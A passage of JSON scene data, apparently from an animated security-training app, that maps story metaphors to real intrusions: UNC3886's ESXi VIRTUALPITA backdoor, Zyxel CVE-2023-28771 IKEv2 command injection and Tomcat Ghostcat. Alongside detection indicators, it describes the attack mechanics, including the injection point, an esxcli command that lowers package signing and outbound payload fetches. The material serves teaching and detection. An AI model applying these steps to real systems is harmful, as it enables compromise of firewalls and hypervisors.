          "tone": "sky"
        },
        {
          "storyTerm": "Basement speaking tube",
          "technicalTerm": "Hypervisor-to-guest AF_VSOCK communication channel",
          "tone": "rose"
        },
        {
          "storyTerm": "Floor compliance log",
          "technicalTerm": "ESXi syslog.log and socket listener inventory",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-vcenter-unc3886-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Lowered inspection standard",
          "subtitle": "ESXi AcceptanceLevel reduced to CommunitySupported",
          "tone": "amber"
        },
        {
          "id": "net-vcenter-unc3886-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Unsigned maintenance module",
          "subtitle": "Rogue VIB package deploying VIRTUALPITA",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Tube",
          "stageTag": "STEP 03 · SETUP",
          "title": "Lowered inspection standard",
          "storyExcerpt": "On the hypervisor floor, the intruder lowers the building inspection standard, installs an unsigned maintenance module, and wires a private basement speaking tube that bypasses hallway guards…",
          "technicalParallel": "By chaining AF_VSOCK with CVE-2023-20867 (a VMware Tools authentication bypass in vmtoolsd), UNC3886 can push commands and transfer files from the ESXi hypervisor straight into any guest Virtual Machine…",
          "accentHex": "#06B6D4",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Tube",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Unsigned maintenance module",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses unsigned maintenance module to advance toward basement speaking tube.",
          "technicalParallel": "Using the decrypted vpxuser credentials, UNC3886 logs into the ESXi hypervisor, lowers its package signature requirement (esxcli software acceptance set --level=CommunitySupported), and installs an…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Tube",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Floor compliance log",
          "storyExcerpt": "Behind the scenes, floor compliance log captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Mandiant (hypervisor persistence and covert-channel detection guidance): ESXi syslog.log showing AcceptanceLevel lowered to CommunitySupported, unsigned VIB package installations, and lsof…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Fleet Console",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Directory Seal",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Heap Fault",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1547"
    },
    "memory-forensics": {
      "scenarioId": "vmware-vcenter-cve-2023-34048-unc3886",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-vcenter-unc3886-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
      "title": "UNC3886: vCenter vmdird Out-of-Bounds Write & ESXi VIRTUALPITA Backdoor — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of fleet console beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: vmsyslogd (VIRTUALPITA ESXi) (VIRTUALPITA ELF64 Backdoor (ESXi Userworld) [R-X])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of vmsyslogd (VIRTUALPITA ESXi)",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x0000000000401000 (R-X, 44 KB) · VIRTUALPITA ELF64 Backdoor (ESXi Userworld)",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against vmsyslogd (VIRTUALPITA ESXi) (PID 2098144)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "Passive 64-bit ELF backdoor on ESXi binding to AF_VSOCK (Address Family 40) to bridge hypervisor and guest VMs without…",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-vcenter-unc3886-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of vmsyslogd…",
          "tone": "sky"
        },
        {
          "id": "net-vcenter-unc3886-memory-xray-right",
          "tag": "LIVE MEMORY · R-X",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x0000000000401000 (R-X, 44 KB) · VIRTUALPITA ELF64 Backdoor…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline vmsyslogd (VIRTUALPITA ESXi) loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x0000000000401000 (R-X, 44 KB) containing VIRTUALPITA ELF64 Backdoor (ESXi Userworld).",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 2098144 confirms injected region: Passive 64-bit ELF backdoor on ESXi binding to AF_VSOCK (Address Family 40) to bridge hypervisor and guest VMs without TCP/IP packets.",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "zyxel-firewall-cve-2023-28771-ike-rce": {
    "briefing": {
      "scenarioId": "zyxel-firewall-cve-2023-28771-ike-rce",
      "sectionKey": "briefing",
      "sceneKind": "net-zyxel-ike-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Zyxel Firewall Pre-Auth IKEv2 Packet Decoder Command Injection — Story-to-Technical Overview",
      "storyCue": "A perimeter guardhouse validates sealed tunnel-setup envelopes using a single factory stamp shared across every model, and reads only the top flap while copying the rest of the letter straight onto a spoken loudspeaker log. A single unauthenticated envelope carries a hidden command on its lower half, seizing the entire guardhouse before any tunnel handshake finishes.",
      "technicalCue": "INITIAL ACCESS: CRAFTING AN IKEV2 NOTIFY PAYLOAD WITH ZYXEL’S HARDCODED 3DES KEY (CVE-2023-28771) -> EXECUTION: BREAKING OUT OF SYSTEM(\"ECHO ... >> /TMP/SDWAN_VPNDEBUG.LOG\") -> LATERAL & C2: PERIMETER FIREWALL TAKEOVER & INTERNAL LAN PIVOTING",
      "storyMappings": [
        {
          "storyTerm": "Perimeter guardhouse",
          "technicalTerm": "Zyxel VPN firewall gateway appliance",
          "tone": "amber"
        },
        {
          "storyTerm": "Shared factory stamp",
          "technicalTerm": "Hardcoded 3DES key decrypting only the first 48 bytes",
          "tone": "sky"
        },
        {
          "storyTerm": "Spoken loudspeaker log",
          "technicalTerm": "Unsafe shell invocation writing sdwan_vpndebug.log",
          "tone": "rose"
        },
        {
          "storyTerm": "Single-envelope takeover",
          "technicalTerm": "Pre-auth UDP/500 IKEv2 command injection (CVE-2023-28771)",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-zyxel-ike-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Perimeter guardhouse",
          "subtitle": "Zyxel VPN firewall gateway appliance",
          "tone": "amber"
        },
        {
          "id": "net-zyxel-ike-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Shared factory stamp",
          "subtitle": "Hardcoded 3DES key decrypting only the first 48 bytes",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Long Text",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "CRAFTING AN IKEV2 NOTIFY PAYLOAD WITH ZYXEL’S HARDCODED 3DES KEY (CVE-2023-28771)",
          "storyExcerpt": "An outsider seals the first short header strip of a tunnel-setup notice with the factory stamp and leaves the long trailing message in plain text, slipping past the envelope verifier on the first knock.",
          "technicalParallel": "The appliance parser decrypts only the first 48 bytes of the Notify payload using a static built-in key (allowing an unauthenticated remote sender to craft a valid packet header without prior…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Core Pivot",
          "stageTag": "STAGE 02 · EXECUTION",
          "title": "BREAKING OUT OF SYSTEM(\"ECHO ... >> /TMP/SDWAN_VPNDEBUG.LOG\")",
          "storyExcerpt": "To record the error notice in the shift notebook, the guard reads the raw visitor message directly into the building command intercom. The extra punctuation inside the message splits the sentence and…",
          "technicalParallel": "Passing network-supplied strings directly into a C system() call to append lines to a log file (instead of opening the file safely with native file APIs) forces the operating system to invoke a command…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Gate Full",
          "stageTag": "STAGE 03 · LATERAL & C2",
          "title": "PERIMETER FIREWALL TAKEOVER & INTERNAL LAN PIVOTING",
          "storyExcerpt": "With a single packet delivered to the front gate, the perimeter guardhouse turns outward to fetch external toolkits, giving the outsider full master control over the network border.",
          "technicalParallel": "Because UDP source IP addresses can be spoofed when no handshake is required, attackers could even trigger blind command execution across wide IP ranges in seconds.",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Guardhouse",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Tunnel Relay",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Packet Burst",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "zyxel-firewall-cve-2023-28771-ike-rce",
      "sectionKey": "step-1",
      "sceneKind": "net-zyxel-ike-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Encrypting a 48-Byte IKEv2 Notify Header with Zyxel’s Hardcoded 3DES Key (CVE-2023-28771)",
      "storyCue": "An outsider seals the first short header strip of a tunnel-setup notice with the factory stamp and leaves the long trailing message in plain text, slipping past the envelope verifier on the first knock.",
      "technicalCue": "T1190 · INITIAL ACCESS — As reverse-engineered by TRAPA Security and Rapid7, Zyxel’s VPN key-exchange daemon (/usr/sbin/ssod linked with /lib/libike.so) listens on UDP port 500.",
      "storyMappings": [
        {
          "storyTerm": "Short sealed header strip",
          "technicalTerm": "48-byte encrypted IKEv2 Notify Type 14 header",
          "tone": "amber"
        },
        {
          "storyTerm": "Plain-text trailing message",
          "technicalTerm": "Unencrypted payload bytes appended beyond offset 48",
          "tone": "sky"
        },
        {
          "storyTerm": "Envelope verifier module",
          "technicalTerm": "Appliance libike.so IKEv2 packet parser",
          "tone": "rose"
        },
        {
          "storyTerm": "Front tunnel mailbox",
          "technicalTerm": "Publicly reachable UDP port 500 IKEv2 listener",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-zyxel-ike-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Short sealed header strip",
          "subtitle": "48-byte encrypted IKEv2 Notify Type 14 header",
          "tone": "amber"
        },
        {
          "id": "net-zyxel-ike-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Plain-text trailing message",
          "subtitle": "Unencrypted payload bytes appended beyond offset 48",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Long Text",
          "stageTag": "STEP 01 · SETUP",
          "title": "Short sealed header strip",
          "storyExcerpt": "An outsider seals the first short header strip of a tunnel-setup notice with the factory stamp and leaves the long trailing message in plain text, slipping past the envelope verifier on the…",
          "technicalParallel": "The appliance parser decrypts only the first 48 bytes of the Notify payload using a static built-in key (allowing an unauthenticated remote sender to craft a valid packet header without prior…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Plain-text trailing message",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses plain-text trailing message to advance toward envelope verifier module.",
          "technicalParallel": "As reverse-engineered by TRAPA Security and Rapid7, Zyxel’s VPN key-exchange daemon (/usr/sbin/ssod linked with /lib/libike.so) listens on UDP port 500.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Long Text",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Front tunnel mailbox",
          "storyExcerpt": "Behind the scenes, front tunnel mailbox captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Rapid7 and Suricata SID 2045893 (perimeter IDS rules for Zyxel IKEv2 exploitation): Inbound UDP/500 IKEv2 Notify Type 14 packets exceeding 48 bytes and containing unexpected…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Guardhouse",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Tunnel Relay",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Packet Burst",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "zyxel-firewall-cve-2023-28771-ike-rce",
      "sectionKey": "step-2",
      "sceneKind": "net-zyxel-ike-step-2",
      "stageBadge": "STEP #2 · EXECUTION",
      "title": "Injecting ;cmd; into system(\"echo ... >> /tmp/sdwan_vpndebug.log\") as Root",
      "storyCue": "To record the error notice in the shift notebook, the guard reads the raw visitor message directly into the building command intercom. The extra punctuation inside the message splits the sentence and triggers unauthorized workshop orders.",
      "technicalCue": "T1059.004 · EXECUTION — To record the SD-WAN VPN debug message, ssod passes the extracted notification string into cmd_string_unescape() and then formats a shell command using snprintf: \"echo %s >>…",
      "storyMappings": [
        {
          "storyTerm": "Shift debug notebook",
          "technicalTerm": "/tmp/sdwan_vpndebug.log diagnostic log file",
          "tone": "amber"
        },
        {
          "storyTerm": "Building command intercom",
          "technicalTerm": "C system() call invoking /bin/sh on untrusted input",
          "tone": "sky"
        },
        {
          "storyTerm": "Sentence-splitting punctuation",
          "technicalTerm": "Shell metacharacter command injection inside Notify text",
          "tone": "rose"
        },
        {
          "storyTerm": "Guardhouse daemon",
          "technicalTerm": "Privileged ssod process spawning shell utilities",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-zyxel-ike-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Shift debug notebook",
          "subtitle": "/tmp/sdwan_vpndebug.log diagnostic log file",
          "tone": "amber"
        },
        {
          "id": "net-zyxel-ike-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Building command intercom",
          "subtitle": "C system() call invoking /bin/sh on untrusted input",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Entry Beat",
          "stageTag": "STEP 02 · SETUP",
          "title": "Shift debug notebook",
          "storyExcerpt": "To record the error notice in the shift notebook, the guard reads the raw visitor message directly into the building command intercom.",
          "technicalParallel": "Passing network-supplied strings directly into a C system() call to append lines to a log file (instead of opening the file safely with native file APIs) forces the operating system to invoke a command…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Core Pivot",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Building command intercom",
          "storyExcerpt": "The extra punctuation inside the message splits the sentence and triggers unauthorized workshop orders.",
          "technicalParallel": "To record the SD-WAN VPN debug message, ssod passes the extracted notification string into cmd_string_unescape() and then formats a shell command using snprintf: \"echo %s >> /tmp/sdwan_vpndebug.log\"…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Down",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Guardhouse daemon",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across guardhouse daemon while locking down sentence-splitting punctuation.",
          "technicalParallel": "Documented by TRAPA Security and Rapid7 (host forensic indicators on compromised appliances): /tmp/sdwan_vpndebug.log containing unexpected command output or the ssod process spawning /bin/sh and…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Guardhouse",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Tunnel Relay",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Packet Burst",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.004"
    },
    "step-3": {
      "scenarioId": "zyxel-firewall-cve-2023-28771-ike-rce",
      "sectionKey": "step-3",
      "sceneKind": "net-zyxel-ike-step-3",
      "stageBadge": "STEP #3 · LATERAL & C2",
      "title": "Single-Packet Root Compromise of the Perimeter Firewall",
      "storyCue": "With a single packet delivered to the front gate, the perimeter guardhouse turns outward to fetch external toolkits, giving the outsider full master control over the network border.",
      "technicalCue": "T1583.005 · LATERAL & C2 — Because CVE-2023-28771 triggers on the very first UDP/500 packet of an IKEv2 exchange (requiring zero authentication or multi-step handshake before reaching the vulnerable logging function)…",
      "storyMappings": [
        {
          "storyTerm": "Single-packet border breach",
          "technicalTerm": "Unauthenticated root compromise over UDP/500",
          "tone": "amber"
        },
        {
          "storyTerm": "Outward toolkit pickup",
          "technicalTerm": "Firewall initiating outbound HTTP fetches for shell scripts",
          "tone": "sky"
        },
        {
          "storyTerm": "Foreign binary kit",
          "technicalTerm": "Downloaded MIPS64 ELF malware payload",
          "tone": "rose"
        },
        {
          "storyTerm": "Egress watchtower log",
          "technicalTerm": "Upstream firewall or DNS logs recording anomalous egress",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-zyxel-ike-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Single-packet border breach",
          "subtitle": "Unauthenticated root compromise over UDP/500",
          "tone": "amber"
        },
        {
          "id": "net-zyxel-ike-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Outward toolkit pickup",
          "subtitle": "Firewall initiating outbound HTTP fetches for shell scripts",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Gate Full",
          "stageTag": "STEP 03 · SETUP",
          "title": "Single-packet border breach",
          "storyExcerpt": "With a single packet delivered to the front gate, the perimeter guardhouse turns outward to fetch external toolkits, giving the outsider full master control over the network border.",
          "technicalParallel": "Because UDP source IP addresses can be spoofed when no handshake is required, attackers could even trigger blind command execution across wide IP ranges in seconds.",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Kit",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Outward toolkit pickup",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses outward toolkit pickup to advance toward foreign binary kit.",
          "technicalParallel": "Because CVE-2023-28771 triggers on the very first UDP/500 packet of an IKEv2 exchange (requiring zero authentication or multi-step handshake before reaching the vulnerable logging function), the…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Gate Full",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Egress watchtower log",
          "storyExcerpt": "Behind the scenes, egress watchtower log captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in CISA KEV and Shadowserver telemetry (post-exploitation network indicators for perimeter firewalls): Zyxel firewalls initiating outbound HTTP requests to retrieve scripts and MIPS64 ELF…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Guardhouse",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Tunnel Relay",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Packet Burst",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1583.005"
    },
    "memory-forensics": {
      "scenarioId": "zyxel-firewall-cve-2023-28771-ike-rce",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-zyxel-ike-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
      "title": "Zyxel Firewall Pre-Auth IKEv2 Packet Decoder Command Injection — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of guardhouse beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: sh (Injected via sdwan_vpndebug.log) (ssod Stack Buffer (snprintf echo command) [RW-])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of sh (Injected via sdwan_vpndebug.log)",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x00007FFF48102000 (RW-, 4 KB) · ssod Stack Buffer (snprintf echo command)",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against sh (Injected via sdwan_vpndebug.log) (PID 9410)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "Stack buffer inside ssod where the decrypted Notify payload breaks out of \"echo ... >> /tmp/sdwan_vpndebug.log\".",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-zyxel-ike-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of sh (Injected…",
          "tone": "sky"
        },
        {
          "id": "net-zyxel-ike-memory-xray-right",
          "tag": "LIVE MEMORY · RW-",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x00007FFF48102000 (RW-, 4 KB) · ssod Stack Buffer (snprintf…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline sh (Injected via sdwan_vpndebug.log) loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x00007FFF48102000 (RW-, 4 KB) containing ssod Stack Buffer (snprintf echo command).",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 9410 confirms injected region: Stack buffer inside ssod where the decrypted Notify payload breaks out of \"echo ... >> /tmp/sdwan_vpndebug.log\".",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "dfir-apache-tomcat-ghostcat-ajp-manager-war-deployment": {
    "briefing": {
      "scenarioId": "dfir-apache-tomcat-ghostcat-ajp-manager-war-deployment",
      "sectionKey": "briefing",
      "sceneKind": "net-tomcat-ghostcat-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Tomcat AJP Ghostcat (CVE-2020-1938) & /manager/text/deploy WAR Forensics — Story-to-Technical Overview",
      "storyCue": "A Java application building leaves an internal freight elevator door open directly to the public street. An outsider reaches through that freight shaft to read the building staff passcode sheet, uses those passcodes at the package loading dock to upload a disguised web bundle, and triggers freshly compiled control pages inside the workshop.",
      "technicalCue": "INITIAL ACCESS: AJP/1.3 Port 8009 javax.servlet.include.path_info File Read (CVE-2020-1938 Ghostcat) -> PERSISTENCE: Authenticated WAR Upload via PUT /manager/text/deploy (localhost_access_log & catalina.out) -> EXECUTION: Jasper JSP Compilation (work/Catalina/localhost/*/*_jsp.class) & JVM Child Process Execution",
      "storyMappings": [
        {
          "storyTerm": "Open street-facing freight shaft",
          "technicalTerm": "Exposed Tomcat AJP/1.3 connector on TCP port 8009",
          "tone": "amber"
        },
        {
          "storyTerm": "Staff passcode sheet",
          "technicalTerm": "Read WEB-INF/web.xml or tomcat-users.xml (CVE-2020-1938)",
          "tone": "sky"
        },
        {
          "storyTerm": "Disguised package bundle",
